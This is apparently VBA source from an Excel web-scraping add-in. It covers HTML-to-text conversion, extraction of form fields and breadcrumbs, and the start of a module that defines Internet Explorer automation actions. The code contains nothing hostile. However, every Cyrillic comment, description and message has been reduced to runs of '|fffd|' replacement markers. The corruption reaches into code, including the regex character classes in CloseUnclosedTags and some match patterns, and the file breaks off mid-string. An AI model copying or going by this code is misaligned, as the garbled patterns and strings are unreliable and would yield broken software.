        txt = Replace(txt, vbNewLine, vbLf): txt = Replace(txt, vbLf, vbNewLine)
        MultiReplace txt, "<br>" & vbNewLine, "<br>"
        MultiReplace txt, vbNewLine & "<br>", "<br>"

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        For Each Tag In Split(ADD_NL$, ",")
            txt = Replace(txt, Tag, vbNewLine, , , vbTextCompare)
        Next Tag
        For Each Tag In Split(ADD_TAB$, ",")
            txt = Replace(txt, Tag, vbTab, , , vbTextCompare)
        Next Tag

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        .Pattern = "<[^<>]+>"
        txt$ = .Replace(txt$, "")

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        For Each char In Split(HTML_SP$, ";")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| &|fffd|opy; |fffd| &nbs|fffd|;
            If InStr(1, txt$, Split(char, "=")(0), vbBinaryCompare) Then
                txt$ = Replace(txt$, "&" & Split(char, "=")(0) & ";", ChrW(Val(Split(char, "=")(1))), , , vbBinaryCompare)
            End If
        Next char

        .Pattern = "&#(\d{2,5});"        ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| &#84l0;
        If .test(txt$) Then
            For Each char In .Execute(txt)
                txt$ = Replace(txt$, char.value, ChrW(Val(char.submatches.item(0))))
            Next
        End If

        .Pattern = "&#x([A-Fa-f0-9]{1,4});"        ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| &#x411;
        If .test(txt$) Then
            For Each char In .Execute(txt)
                txt$ = Replace(txt$, char.value, ChrW(Val("&H" & char.submatches.item(0))))
            Next
        End If

        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        MultiReplace txt, " " & vbTab, vbTab: MultiReplace txt, vbTab & " ", vbTab
        MultiReplace txt, vbTab & vbNewLine, vbNewLine: MultiReplace txt, vbNewLine & vbTab, vbNewLine
        MultiReplace txt$, vbNewLine & vbNewLine & vbNewLine, vbNewLine & vbNewLine
        MultiReplace txt, vbNewLine & " " & vbNewLine, vbNewLine
        MultiReplace txt, " " & vbNewLine, vbNewLine

        If RemoveExtraLF Then MultiReplace txt$, vbNewLine & vbNewLine, vbNewLine

        While txt$ Like "*" & vbNewLine: txt = Left(txt, Len(txt) - Len(vbNewLine)): Wend
        While txt$ Like vbNewLine & "*": txt = Mid(txt, Len(vbNewLine) + 1): Wend

    End With
    Erase arr: Err.Clear
    ConvertHTMLtoText = txt$
End Function

Sub MultiReplace(ByRef txt$, ByVal Find$, ByVal Replacement$)
    On Error Resume Next: Dim n&
    If InStr(1, Replacement$, Find$, vbBinaryCompare) Then Exit Sub        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    While (InStr(1, txt$, Find$, vbBinaryCompare) > 0) And (n < 100)
        n = n + 1: txt$ = Replace(txt$, Find$, Replacement$)
    Wend
End Sub

Function CleanHTML(ByRef txt$)
    If v_1 Then txt$ = Replace(txt, "</d", "<d"): txt$ = Replace(txt, "</s", "<s")
End Function

Function CloseUnclosedTags(ByVal txt$) As String
    On Error Resume Next: CloseUnclosedTags = txt$: Dim char
    With REGEXP
        .Pattern = "(<[A-Za-z|fffd|-|fffd||fffd|-|fffd||fffd||fffd|1-6]+\b[^<>]*)(<[A-Za-z|fffd|-|fffd||fffd|-|fffd||fffd||fffd|1-6]+\b)"
        If .test(txt$) Then CloseUnclosedTags = .Replace(txt$, "$1>$2")
        '            For Each char In .Execute(txt)
        '                Debug.Print char.Value: Debug.Print  char.submatches.item(0):Debug.Print char.submatches.item(1)
        '            Next
    End With
End Function

Function GetTestFile() As String
    On Error Resume Next: Dim FSO As Object, ts As Object
    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.OpenTextFile("c:\test.txt", 1, True, True): GetTestFile = ts.ReadAll: ts.Close
    Set ts = Nothing: Set FSO = Nothing
End Function

Function LoadFormData(ByVal txt$, Optional ByVal Filters$, Optional ByVal IncludeParams$, Optional ByVal ExcludeParams$, _
                      Optional ByVal VarName$, Optional ByVal ReturnValue$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| INPUT-|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim arr As Variant, FieldName$, FieldValue$, i&, dic As New Dictionary, field, key, res$
    Dim msg$, FilterApplied As Boolean, LenTXT&, OK As Boolean, n&

    If Filters$ Like "*=*" Then
        LenTXT& = Len(txt)
        txt$ = ApplyHTMLFilters(txt$, Filters$, msg$)        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Len(txt) < LenTXT& Then FilterApplied = True Else msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.<br />"
    End If

    If txt Like "*<form*" Then
        txt = GetTags(txt, "form", , , "outerHTML 1")
    Else
        msg$ = msg$ & "<strong>|fffd||fffd||fffd||fffd||fffd||fffd|: </strong> <span style='color:red;'>|fffd| HTML-|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.</span>"
        GoTo ExitLoadFormData
    End If

    arr = Split(GetTags(txt, "input", , , "outerHTML"), ARSEP)

    For i = LBound(arr) To UBound(arr)
        FieldName$ = "": FieldValue$ = ""
        FieldName$ = GetAttributeFromTag(arr(i), "name")
        FieldValue$ = GetAttributeFromTag(arr(i), "value")
        If Len(FieldName$) Then dic.item(CStr(FieldName$)) = FieldValue$
    Next i
    msg$ = msg$ & "<strong>|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|: " & UBound(arr) + 1 & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & dic.Count & "</strong><br />"

    If Len(IncludeParams$) Then
        n& = 0
        For Each field In Split(IncludeParams$, "&")
            FieldName$ = "": FieldValue$ = ""
            FieldName$ = Split(field, "=", 2)(0)
            FieldValue$ = Split(field, "=", 2)(1)
            If Len(FieldName$) Then n& = n& + 1: dic.item(CStr(FieldName$)) = FieldValue$
        Next
        msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & n& & "  (|fffd||fffd||fffd||fffd||fffd|: " & dic.Count & ")<br />"
    End If

    If Len(ExcludeParams$) Then
        For Each field In Split(ExcludeParams$, "&")
            FieldName$ = "": FieldValue$ = ""
            FieldName$ = Split(field, "=", 2)(0)
            'FieldValue$ = Split(field, "=", 2)(1)
            If Len(FieldName$) Then dic.Remove FieldName$
            If FieldName$ = "blank" Then
                For Each key In dic.Keys
                    If dic.item(CStr(key)) = "" Then dic.Remove CStr(key)
                Next
            End If
        Next
        msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & dic.Count & "<br />"
    End If

    n& = 0: ReDim resArr(1 To dic.Count)
    For Each key In dic.Keys
        FieldName$ = "": FieldValue$ = ""
        FieldName$ = CStr(key): FieldValue$ = dic.item(CStr(key))
        'n = n + 1: resArr(n) = FieldName$ & "=" & Replace(FieldValue$, "&", "%26")
        n = n + 1: resArr(n) = FieldName$ & "=" & URL_Encode3(FieldValue$)
        'res$ = res$ & vbNewLine & FieldName$ & "=" & Left(FieldValue$, 20) & IIf(Len(FieldValue$) > 20, "... (|fffd||fffd||fffd||fffd||fffd|=" & Len(FieldValue$) & ")", "")
    Next

    res$ = Join(resArr, "&")
    If Len(Trim(VarName$)) Then ParserVariables.item("%" & VarName$ & "%") = res$
    If ReturnValue$ Like "*|fffd||fffd||fffd||fffd||fffd||fffd|*" Then res$ = Join(resArr, ARSEP)

    LoadFormData = res
    Set dic = Nothing: OK = True

ExitLoadFormData:
    If Len(msg$) Then If TEST_ACTIONS_MODE Then AddBalloon msg$, IIf(OK, bt_Information, bt_Warning)
End Function

Function GetBreadcrumbs(ByVal txt$, Optional ByVal Filters$, Optional FirstIndex&, Optional RemoveLast&) As String
    On Error Resume Next

    Dim msg$, ClassName, arr, i&, values, LenTXT&, res$, BreadcrumbsClasses, FilterApplied As Boolean, Breadcrumbs$

    If Filters$ = "auto" Then Filters$ = ""
    If Len(Trim(Filters$)) Then
        LenTXT& = Len(txt)
        txt$ = ApplyHTMLFilters(txt$, Filters$, msg$)        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Len(txt) < LenTXT& Then FilterApplied = True
    End If

    BreadcrumbsClasses = Array("breadcrumbs", "*breadcrumb*", "nav")

    For Each ClassName In BreadcrumbsClasses
        res$ = GetTags(txt, "any tag", "(class|id)", ClassName, "outerHTML 1")
        If Len(res) Then txt = res: FilterApplied = True: Exit For
    Next

    If Not FilterApplied Then
        msg = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML"
        GoTo ExitSearchBreadcrumbs
    End If

    values = GetTags(txt, "a", , , "ConvertToText")

    If Len(values) Then

        arr = Split(values, ARSEP)

        For i = LBound(arr) To UBound(arr)
            arr(i) = Trim(arr(i))
        Next i

        For i = IIf(FirstIndex&, FirstIndex& - 1, 0) To UBound(arr) - RemoveLast&
            Breadcrumbs$ = Breadcrumbs$ & IIf(Breadcrumbs$ = "", "", ARSEP) & arr(i)
        Next i
        GetBreadcrumbs = Breadcrumbs
        Exit Function

    Else
        msg$ = msg$ & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| A) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd|.<br />"
    End If

ExitSearchBreadcrumbs:
    If Len(msg$) Then If TEST_ACTIONS_MODE Then AddBalloon msg$, bt_Warning
End Function


Function ConvertTags(ByVal txt$, ByVal Filter1$, ByVal Result1$, ByVal Filter2$, ByVal Result2$, ByVal Filter3$, ByVal Result3$) As String
    On Error Resume Next
    Dim res1$, res2$, res3$

    If Filter1$ = "" Then Filter1$ = "Any Tag"
    If Filter2$ = "" Then Filter2$ = "Any Tag"
    If Filter3$ = "" Then Filter3$ = "Any Tag"

    res1$ = ApplyHTMLFilters(txt$, Filter1$, , Result1$)
    res2$ = ApplyHTMLFilters(txt$, Filter2$, , Result2$)

    res1$ = Trim(Application.Trim(Replace(Replace(Replace(Replace(res1, vbNewLine, " "), vbLf, " "), vbTab, " "), Chr(160), " ")))
    res2$ = Trim(Application.Trim(Replace(Replace(Replace(Replace(res2, vbNewLine, " "), vbLf, " "), vbTab, " "), Chr(160), " ")))

    If Len(res1) + Len(res2) > 0 Then
        ConvertTags = res1$ & "|" & res2$
        If Len(Result3$) Then
            res3$ = ApplyHTMLFilters(txt$, Filter3$, , Result3$)
            res3$ = Trim(Application.Trim(Replace(Replace(Replace(Replace(res3, vbNewLine, " "), vbLf, " "), vbTab, " "), Chr(160), " ")))
            ConvertTags = ConvertTags & "|" & res3$
        End If
    End If
End Function
Attribute VB_Name = "mod_AAs_IE"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_IE_and_WebQuery
' Author        : EducatedFool                     Date: 31.08.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Sub InitializeActions_IE(ByRef AAs As ArrayActions)
    On Error Resume Next
    
    With AAs.AddAction(fc_IE, "IE_Start", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_IE, "IE_Quit", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer"
        
        .AddParameter "Instance", aps_List, "|fffd||fffd||fffd||fffd||fffd| IE |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("active", "all", "all v.2"), "active"
    End With
    
    With AAs.AddAction(fc_IE, "IE_ConnectToExisting", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|), |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| IE |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|IE not found|fffd|"
        .AddParameter "URL", aps_Text, "URL (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "ActivateWindow", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| IE", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_IE, "IE_Navigate", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| Internet Explorer")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|), |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "URL", aps_Text, "URL (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Mask", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML-|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_IE, "IE_Scroll", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| Internet Explorer")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|...|fffd|, - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|) - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|URL |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)."
        .AddParameter "Timeout", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "LinkToClick", aps_Text, "|fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|..|fffd|"
        .AddParameter "MaxScrolls", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "CacheURL", aps_Text, "URL |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_IE, "IE_Visible", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer"
        .AddParameter "Visible", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_IE, "IE_Click", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| Internet Explorer")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Internet Explorer" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (outerHTML) HTML |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
